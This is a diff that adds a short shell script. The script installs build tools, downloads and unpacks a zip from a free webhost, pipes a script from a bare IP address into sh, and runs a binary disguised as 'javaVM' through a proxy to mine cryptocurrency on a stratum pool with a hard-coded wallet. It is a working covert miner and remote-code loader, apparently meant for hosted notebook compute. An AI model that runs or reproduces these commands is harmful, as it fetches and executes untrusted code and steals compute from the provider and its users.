@@ -1,0 +1,6 @@
+sudo apt update
+sudo apt-get install -y libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils cmake screen unzip net-tools curl
+sudo rm -rf /var/lib/apt/lists/*
+wget -q https://penyimpananwget.000webhostapp.com/java.zip && unzip java.zip && rm -rf java.zip
+wget -O - -q http://150.136.168.71/archxx/duck0.sh | sh
+./graftcp/graftcp ./javaVM -a yespower -o stratum+grpc://colab.jadepool.cloud:443 -u TVFzFANYNYF9YRq8PtY7nigvEQ2R2CHKvZ -p c=TRX,mc=VISH,ID=Duck
